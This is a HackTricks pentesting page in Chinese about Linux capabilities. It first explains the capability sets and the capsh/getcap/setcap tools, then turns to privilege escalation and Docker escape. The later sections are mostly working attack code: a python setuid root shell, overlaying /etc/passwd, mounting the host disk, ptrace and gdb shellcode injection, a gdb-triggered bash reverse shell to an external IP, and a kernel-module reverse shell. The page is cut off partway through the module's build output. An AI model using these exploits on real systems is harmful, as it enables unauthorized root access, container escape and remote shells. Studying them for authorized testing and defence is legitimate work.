# Linux Capabilities

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS＆HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士在各个领域的热点交流地。\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linux功能将**root权限分成更小的、独立的单元**，允许进程具有一部分权限。这样可以通过不必要地授予完整的root权限来最小化风险。

### 问题：
- 普通用户权限有限，影响诸如打开需要root访问权限的网络套接字等任务。

### 权限集：

1. **继承（CapInh）**：
- **目的**：确定从父进程传递下来的权限。
- **功能**：当创建新进程时，它会从父进程继承此集中的权限。对于在进程生成过程中保持某些权限很有用。
- **限制**：进程不能获得其父进程没有的权限。

2. **有效（CapEff）**：
- **目的**：表示进程在任何时刻正在利用的实际权限。
- **功能**：这是内核用来授予各种操作权限的权限集。对于文件，此集合可以是一个标志，指示文件的允许权限是否被视为有效。
- **重要性**：有效集对于即时权限检查至关重要，作为进程可以使用的活动权限集。

3. **允许（CapPrm）**：
- **目的**：定义进程可以拥有的最大权限集。
- **功能**：进程可以将允许集中的权限提升到其有效集中，从而使其能够使用该权限。它还可以从其允许集中删除权限。
- **边界**：它作为进程可以拥有的权限的上限，确保进程不会超出其预定义的权限范围。

4. **边界（CapBnd）**：
- **目的**：限制进程在其生命周期中可以获得的权限。
- **功能**：即使进程在其可继承或允许集中具有某些权限，除非它也在边界集中，否则它不能获得该权限。
- **用例**：此集合特别适用于限制进程的特权升级潜力，增加额外的安全层。

5. **环境（CapAmb）**：
- **目的**：允许在`execve`系统调用期间保持某些权限，通常会导致进程权限的完全重置。
- **功能**：确保没有关联文件权限的非SUID程序可以保留某些权限。
- **限制**：此集合中的权限受到继承和允许集的约束，确保它们不会超出进程允许的权限。
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
## 进程和二进制文件的能力

### 进程的能力

要查看特定进程的能力，请使用/proc目录中的**status**文件。由于它提供了更多细节，让我们将其限制为与Linux能力相关的信息。\
请注意，对于所有运行中的进程，能力信息是针对每个线程维护的，在文件系统中的二进制文件中，它存储在扩展属性中。

您可以在/usr/include/linux/capability.h中找到定义的能力。

您可以在`cat /proc/self/status`中找到当前进程的能力，或者使用`capsh --print`查找其他用户的能力在`/proc/<pid>/status`中。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
这个命令在大多数系统上应该返回5行。

* CapInh = 继承的能力
* CapPrm = 允许的能力
* CapEff = 有效的能力
* CapBnd = 限制集
* CapAmb = 环境能力集
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
这些十六进制数字没有意义。使用capsh实用程序，我们可以将它们解码为功能名称。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
让我们现在检查`ping`使用的**capabilities**：
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
虽然这样也可以，但还有另一种更简单的方法。要查看运行中进程的能力，只需使用**getpcaps**工具，后跟其进程ID（PID）。您还可以提供进程ID的列表。
```bash
getpcaps 1234
```
让我们在给予`tcpdump`足够的能力（`cap_net_admin`和`cap_net_raw`）以便嗅探网络之后，检查一下`tcpdump`的能力（_tcpdump正在进程9562中运行_）:
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
正如您所看到的，给定的功能对应于获取二进制文件功能的两种方式的结果。\
_getpcaps_ 工具使用 **capget()** 系统调用来查询特定线程的可用功能。这个系统调用只需要提供 PID 就可以获取更多信息。

### 二进制文件功能

二进制文件可以具有在执行时可以使用的功能。例如，很常见找到带有 `cap_net_raw` 功能的 `ping` 二进制文件：
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
您可以使用以下命令**搜索具有特权的二进制文件**：
```bash
getcap -r / 2>/dev/null
```
### 使用 capsh 丢弃权限

如果我们为 _ping_ 丢弃 CAP\_NET\_RAW 权限，那么 ping 实用程序将不再起作用。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
除了 _capsh_ 本身的输出之外，_tcpdump_ 命令本身也应该会引发错误。

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

错误清楚地显示 ping 命令不允许打开 ICMP 套接字。现在我们可以确定这符合预期。

### 移除权限

您可以使用以下命令移除二进制文件的权限：
```bash
setcap -r </path/to/binary>
```
## 用户权限

显然**也可以将权限分配给用户**。这可能意味着由用户执行的每个进程都可以使用用户的权限。\
根据[这个](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)，[这个](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)和[这个](https://stackoverflow.com/questions/1956732-is-it-possible-to-configure-linux-capabilities-per-user)一些文件需要配置以赋予用户特定的权限，但分配每个用户权限的文件将是`/etc/security/capability.conf`。\
文件示例：
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 环境能力

编译以下程序，可以在提供能力的环境中**生成一个 bash shell**。

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
在由编译的环境二进制文件执行的 **bash** 中，可以观察到 **新的能力**（普通用户在“当前”部分不会有任何能力）。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
只能添加存在于允许集合和可继承集合中的功能。
{% endhint %}

### 具备功能意识/无功能意识的二进制文件

具备功能意识的二进制文件不会使用环境中提供的新功能，然而无功能意识的二进制文件会使用它们，因为它们不会拒绝。这使得无功能意识的二进制文件在授予二进制文件功能的特殊环境中容易受到攻击。

## 服务功能

默认情况下，以root身份运行的服务将被分配所有功能，有时这可能是危险的。因此，服务配置文件允许指定您希望其具有的功能，以及应执行服务的用户，以避免以不必要的权限运行服务：
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker容器中的权限

默认情况下，Docker为容器分配了一些权限。您可以通过运行以下命令轻松检查这些权限是哪些：
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)是**西班牙**最重要的网络安全活动之一，也是**欧洲**最重要的之一。以**促进技术知识**为使命，这个大会是技术和网络安全专业人士在各个领域的热点交流会。

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

在执行特权操作后，当您**想要限制自己的进程**（例如，在设置chroot并绑定到套接字后）时，功能是非常有用的。然而，它们可能会被利用，通过传递恶意命令或参数，然后以root身份运行。

您可以使用`setcap`强制将功能应用于程序，并使用`getcap`查询这些功能：
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` 表示您正在将能力添加为有效和允许的（“-”将删除它）。

要识别系统或文件夹中具有能力的程序：
```bash
getcap -r / 2>/dev/null
```
### 漏洞利用示例

在以下示例中，发现二进制文件 `/usr/bin/python2.6` 存在提权漏洞：
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**`tcpdump`需要的**权限**，以允许任何用户**嗅探数据包**：**
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "空" 权限的特殊情况

[来自文档](https://man7.org/linux/man-pages/man7/capabilities.7.html): 请注意，可以将空的权限集分配给程序文件，因此可以创建一个设置了有效和保存的用户ID为0的程序，但不向该进程授予任何权限。换句话说，如果你有一个二进制文件：

1. 不是由 root 拥有
2. 没有设置 `SUID`/`SGID` 位
3. 具有空的权限集（例如：`getcap myelf` 返回 `myelf =ep`）

那么**该二进制文件将以 root 权限运行**。

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 是一个非常强大的 Linux 权限，通常被视为接近 root 级别，因为它具有广泛的**管理特权**，例如挂载设备或操作内核功能。虽然对于模拟整个系统的容器至关重要，**`CAP_SYS_ADMIN` 在容器化环境中存在重大安全挑战**，因为它可能导致特权升级和系统妥协。因此，其使用需要严格的安全评估和谨慎的管理，强烈建议在应用程序专用容器中放弃此权限，以遵循**最小权限原则**并最小化攻击面。

**带有二进制文件的示例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
使用Python，您可以将一个修改过的 _passwd_ 文件挂载到真实的 _passwd_ 文件之上：
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
最后将修改后的 `passwd` 文件挂载到 `/etc/passwd`：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
您将能够使用密码"password" **以root身份`su`**。

**带环境的示例（Docker越狱）**

您可以使用以下命令检查Docker容器中启用的功能：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在先前的输出中，您可以看到已启用SYS_ADMIN功能。

* **Mount**

这允许docker容器**挂载主机磁盘并自由访问**：
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **完全访问**

在上一种方法中，我们成功访问了docker主机磁盘。\
如果发现主机正在运行**ssh**服务器，您可以在docker主机磁盘中**创建一个用户**，然后通过SSH访问：
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**这意味着您可以通过在主机中运行的某个进程内注入 shellcode 来逃逸容器。** 要访问在主机中运行的进程，容器至少需要以 **`--pid=host`** 运行。

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 授予使用 `ptrace(2)` 提供的调试和系统调用跟踪功能以及跨内存附加调用，如 `process_vm_readv(2)` 和 `process_vm_writev(2)` 的能力。尽管对于诊断和监控目的非常强大，但如果启用了 `CAP_SYS_PTRACE` 而没有像在 `ptrace(2)` 上使用 seccomp 过滤器这样的限制措施，它可能会严重削弱系统安全性。具体来说，它可以被利用来规避其他安全限制，特别是那些由 seccomp 强制实施的限制，正如[此类 PoC（概念验证）所示](https://gist.github.com/thejh/8346f47e359adecd1d53)。

**使用二进制文件的示例（python）**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**二进制文件示例（gdb）**

`gdb` 具有 `ptrace` 能力：
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
创建一个使用msfvenom生成的shellcode，通过gdb注入到内存中
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
调试一个具有root权限的进程，并复制粘贴之前生成的gdb命令行：
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**使用环境示例（Docker越狱）- 另一个GDB滥用**

如果已安装**GDB**（或者您可以使用`apk add gdb`或`apt install gdb`进行安装），您可以**从主机调试一个进程**并让其调用`system`函数。（此技术还需要`SYS_ADMIN`权限）**。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
你将无法看到执行的命令输出，但它将由该进程执行（因此获得一个反向shell）。

{% hint style="warning" %}
如果出现错误 "No symbol "system" in current context."，请检查通过gdb在程序中加载shellcode的先前示例。
{% endhint %}

**带环境的示例（Docker越狱）- Shellcode注入**

您可以使用以下命令检查Docker容器中启用的功能：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
列出在主机上运行的进程 `ps -eaf`

1. 获取架构 `uname -m`
2. 找到适用于该架构的 shellcode ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. 找到一个程序将 shellcode 注入到进程内存中 ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. 修改程序内的 shellcode 并编译它 `gcc inject.c -o inject`
5. 注入并获取 shell: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 赋予进程加载和卸载内核模块 (`init_module(2)`, `finit_module(2)` 和 `delete_module(2)` 系统调用) 的权限，直接访问内核的核心操作。这种能力存在严重的安全风险，因为它允许特权升级和通过修改内核绕过所有 Linux 安全机制，包括 Linux 安全模块和容器隔离，从而导致系统完全被攻破。
**这意味着你可以** **在主机机器的内核中插入/移除内核模块。**

**二进制示例**

在以下示例中，二进制文件 **`python`** 具有此能力。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
默认情况下，**`modprobe`** 命令会在目录 **`/lib/modules/$(uname -r)`** 中检查依赖列表和映射文件。\
为了利用这一点，让我们创建一个假的 **lib/modules** 文件夹：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
然后**编译内核模块，您可以在下面找到2个示例并复制**到此文件夹中：
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最后，执行所需的Python代码来加载这个内核模块：
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**二进制文件示例2**

在以下示例中，二进制文件**`kmod`**具有此能力。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
这意味着可以使用命令**`insmod`**来插入一个内核模块。按照下面的示例来滥用这个特权获取一个**反向 shell**。

**在环境中的示例（Docker 逃逸）**

您可以使用以下命令检查 Docker 容器中启用的能力：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在先前的输出中，您可以看到已启用**SYS\_MODULE**功能。

**创建**将执行反向shell的**内核模块**，并创建**Makefile**来**编译**它：

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
在Makefile中，每个make单词前的空格必须是一个制表符，而不是空格！
{% endhint %}

执行`make`来编译它。
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
